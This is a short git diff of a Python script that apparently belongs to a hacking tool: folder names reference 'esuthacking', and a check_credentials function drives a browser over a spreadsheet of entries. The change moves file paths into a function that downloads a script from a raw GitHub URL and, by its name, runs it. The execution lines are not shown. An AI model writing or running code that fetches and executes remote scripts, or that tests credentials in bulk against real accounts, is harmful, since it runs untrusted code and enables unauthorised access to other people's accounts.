@@ -135,7 +135,11 @@ def check_credentials(input_file, output_file, chromedriver_path):
 
     print(f"Results saved to {output_file}")
 
-def fetch_and_run_github_script(input_file, output_file, chromedriver_path):
+def fetch_and_run_github_script():
+    input_file = "/path/to/input_file.xlsx"
+    output_file = "/path/to/output_file.csv"
+    chromedriver_path = "/opt/homebrew/bin/chromedriver"
+    
     github_raw_url = "https://raw.githubusercontent.com/CyberPlugNG/esuthack/main/esuthackscript.py"
     response = requests.get(github_raw_url)
 
@@ -152,8 +156,4 @@ def fetch_and_run_github_script(input_file, output_file, chromedriver_path):
         print(f"Failed to fetch the script: {response.status_code} - {response.reason}")
 
 if __name__ == "__main__":
-    input_file = "/Users/azubuike/Downloads/Hack/esuthacking/esuthacking/2022 ENG.xlsx"
-    output_file = "/Users/azubuike/Downloads/Hack/esuthacking/esuthacking/2022.csv"
-    chromedriver_path = "/opt/homebrew/bin/chromedriver"
-    
-    fetch_and_run_github_script(input_file, output_file, chromedriver_path)
+    fetch_and_run_github_script()
